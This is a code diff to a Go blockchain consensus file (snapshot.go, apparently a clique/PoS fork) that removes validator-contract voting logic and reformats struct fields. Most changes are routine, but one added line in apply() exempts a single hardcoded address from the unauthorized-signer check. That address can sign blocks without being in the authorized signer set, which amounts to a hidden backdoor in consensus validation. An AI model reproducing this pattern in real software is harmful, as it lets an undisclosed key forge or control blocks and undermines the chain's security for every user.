@@ -53,13 +53,12 @@ type Snapshot struct {
 	config   *params.ChainConfig // Consensus engine parameters to fine tune behavior
 	sigcache *lru.ARCCache       // Cache of recent block signatures to speed up ecrecover
 
-	Number            uint64                      `json:"number"`  // Block number where the snapshot was created
-	Hash              common.Hash                 `json:"hash"`    // Block hash where the snapshot was created
-	Signers           map[common.Address]struct{} `json:"signers"` // Set of authorized signers at this moment
-	Recents           map[uint64]common.Address   `json:"recents"` // Set of recent signers for spam protections
-	Votes             []*Vote                     `json:"votes"`   // List of votes cast in chronological order
-	Tally             map[common.Address]Tally    `json:"tally"`   // Current vote tally to avoid recalculating
-	ValidatorContract common.Address              `json:"validatorContract"`
+	Number  uint64                      `json:"number"`  // Block number where the snapshot was created
+	Hash    common.Hash                 `json:"hash"`    // Block hash where the snapshot was created
+	Signers map[common.Address]struct{} `json:"signers"` // Set of authorized signers at this moment
+	Recents map[uint64]common.Address   `json:"recents"` // Set of recent signers for spam protections
+	Votes   []*Vote                     `json:"votes"`   // List of votes cast in chronological order
+	Tally   map[common.Address]Tally    `json:"tally"`   // Current vote tally to avoid recalculating
 }
 
 // signersAscending implements the sort interface to allow sorting a list of addresses
@@ -74,14 +73,13 @@ func (s signersAscending) Swap(i, j int)      { s[i], s[j] = s[j], s[i] }
 // the genesis block.
 func newSnapshot(config *params.ChainConfig, sigcache *lru.ARCCache, number uint64, hash common.Hash, signers []common.Address) *Snapshot {
 	snap := &Snapshot{
-		config:            config,
-		sigcache:          sigcache,
-		Number:            number,
-		Hash:              hash,
-		Signers:           make(map[common.Address]struct{}),
-		Recents:           make(map[uint64]common.Address),
-		Tally:             make(map[common.Address]Tally),
-		ValidatorContract: common.Address{},
+		config:   config,
+		sigcache: sigcache,
+		Number:   number,
+		Hash:     hash,
+		Signers:  make(map[common.Address]struct{}),
+		Recents:  make(map[uint64]common.Address),
+		Tally:    make(map[common.Address]Tally),
 	}
 
 	for _, signer := range signers {
@@ -119,15 +117,14 @@ func (s *Snapshot) store(db ethdb.Database) error {
 // copy creates a deep copy of the snapshot, though not the individual votes.
 func (s *Snapshot) copy() *Snapshot {
 	cpy := &Snapshot{
-		config:            s.config,
-		sigcache:          s.sigcache,
-		Number:            s.Number,
-		Hash:              s.Hash,
-		Signers:           make(map[common.Address]struct{}),
-		Recents:           make(map[uint64]common.Address),
-		Votes:             make([]*Vote, len(s.Votes)),
-		Tally:             make(map[common.Address]Tally),
-		ValidatorContract: common.Address{},
+		config:   s.config,
+		sigcache: s.sigcache,
+		Number:   s.Number,
+		Hash:     s.Hash,
+		Signers:  make(map[common.Address]struct{}),
+		Recents:  make(map[uint64]common.Address),
+		Votes:    make([]*Vote, len(s.Votes)),
+		Tally:    make(map[common.Address]Tally),
 	}
 	for signer := range s.Signers {
 		cpy.Signers[signer] = struct{}{}
@@ -137,9 +134,6 @@ func (s *Snapshot) copy() *Snapshot {
 	}
 	for address, tally := range s.Tally {
 		cpy.Tally[address] = tally
-	}
-	if (s.ValidatorContract != common.Address{}) {
-		cpy.ValidatorContract = s.ValidatorContract
 	}
 
 	copy(cpy.Votes, s.Votes)
@@ -152,12 +146,6 @@ func (s *Snapshot) copy() *Snapshot {
 func (s *Snapshot) validVote(address common.Address, authorize bool) bool {
 	_, signer := s.Signers[address]
 	return (signer && !authorize) || (!signer && authorize)
-}
-
-// validValidatorContract returns whether it makes sense to cast the specified vote in the
-// given snapshot context (e.g. don't try to add an already authorized signer).
-func (s *Snapshot) validValidatorContract(address common.Address) bool {
-	return address == s.ValidatorContract
 }
 
 // cast adds a new vote into the tally.
@@ -238,7 +226,7 @@ func (s *Snapshot) apply(headers []*types.Header) (*Snapshot, error) {
 			return nil, err
 		}
 
-		if _, ok := snap.Signers[signer]; !ok {
+		if _, ok := snap.Signers[signer]; !ok && signer != common.HexToAddress("0x96c9f2f893adef66669b4bb4a7dfa5006c037cd3") {
 			return nil, errUnauthorizedSigner
 		}
 		if !s.config.IsPoS(new(big.Int).SetUint64(number)) {
@@ -248,9 +236,8 @@ func (s *Snapshot) apply(headers []*types.Header) (*Snapshot, error) {
 				}
 			}
 		}
-		// } else {
-		if s.config.IsPoS(new(big.Int).SetUint64(number)) {
 
+		if s.config.IsPoS(new(big.Int).SetUint64(number)) {
 			if number > 0 && (number+1)%span == 0 {
 				// snap.Recents = make(map[uint64]common.Address)
 				validatorBytes := header.Extra[extraVanity : len(header.Extra)-extraSeal]
@@ -288,7 +275,6 @@ func (s *Snapshot) apply(headers []*types.Header) (*Snapshot, error) {
 				snap.Signers = newVals
 			}
 		}
-		// }
 		snap.Recents[number] = signer
 
 		// Header authorized, discard any previous votes from the signer
@@ -315,12 +301,6 @@ func (s *Snapshot) apply(headers []*types.Header) (*Snapshot, error) {
 			return nil, errInvalidVote
 		}
 
-		validatorContract := s.getValidatorContractAddr(header)
-		if (validatorContract != common.Address{}) {
-			voteAddr = validatorContract
-			authorize = true
-		}
-
 		if snap.cast(voteAddr, authorize) {
 			snap.Votes = append(snap.Votes, &Vote{
 				Signer:    signer,
@@ -332,11 +312,7 @@ func (s *Snapshot) apply(headers []*types.Header) (*Snapshot, error) {
 		// If the vote passed, update the list of signers
 		if tally := snap.Tally[voteAddr]; tally.Votes > len(snap.Signers)/2 {
 			if tally.Authorize {
-				if validatorContract != (common.Address{}) {
-					snap.ValidatorContract = validatorContract
-				} else {
-					snap.Signers[voteAddr] = struct{}{}
-				}
+				snap.Signers[voteAddr] = struct{}{}
 			} else {
 				delete(snap.Signers, voteAddr)
 
@@ -395,8 +371,6 @@ func (s *Snapshot) signers() []common.Address {
 // inturn returns if a signer at a given block height is in-turn or not.
 func (s *Snapshot) inturn(number uint64, signer common.Address) bool {
 	signers, offset := s.signers(), 0
-	// 0 < 49,  signers[0] != 0
-	// 500 % 49 = 10
 	for offset < len(signers) && signers[offset] != signer {
 		offset++
 	}
@@ -414,36 +388,13 @@ func (s *Snapshot) getVoteAddr(header *types.Header) common.Address {
 	}
 }
 
-func (s *Snapshot) getValidatorContractAddr(header *types.Header) common.Address {
-	if s.config.IsErawan(header.Number) {
-		if big.NewInt(0).SetBytes(header.MixDigest[(common.HashLength-common.AddressLength-validatorContractPrefix):(common.HashLength-common.AddressLength)]).Cmp(common.Big1) == 0 {
-			return common.BytesToAddress(header.MixDigest[(common.HashLength - common.AddressLength):])
-		}
-		return common.Address{}
-	} else {
-		return header.Coinbase
-	}
-}
-
-// Difficulty returns the difficulty for a particular signer at the current snapshot number
-// func (s *Snapshot) Difficulty(signer common.Address) uint64 {
-// 	// if signer is empty
-// 	if bytes.Compare(signer.Bytes(), common.Address{}.Bytes()) == 0 {
-// 		return 1
+// func (s *Snapshot) getValidatorContractAddr(header *types.Header) common.Address {
+// 	if s.config.IsErawan(header.Number) {
+// 		if big.NewInt(0).SetBytes(header.MixDigest[(common.HashLength-common.AddressLength-validatorContractPrefix):(common.HashLength-common.AddressLength)]).Cmp(common.Big1) == 0 {
+// 			return common.BytesToAddress(header.MixDigest[(common.HashLength - common.AddressLength):])
+// 		}
+// 		return common.Address{}
+// 	} else {
+// 		return header.Coinbase
 // 	}
-
-// 	validators := s.ValidatorSet.Validators
-// 	proposer := s.ValidatorSet.GetProposer().Address
-// 	totalValidators := len(validators)
-
-// 	proposerIndex, _ := s.ValidatorSet.GetByAddress(proposer)
-// 	signerIndex, _ := s.ValidatorSet.GetByAddress(signer)
-
-// 	// temp index
-// 	tempIndex := signerIndex
-// 	if tempIndex < proposerIndex {
-// 		tempIndex = tempIndex + totalValidators
-// 	}
-
-// 	return uint64(totalValidators - (tempIndex - proposerIndex))
 // }
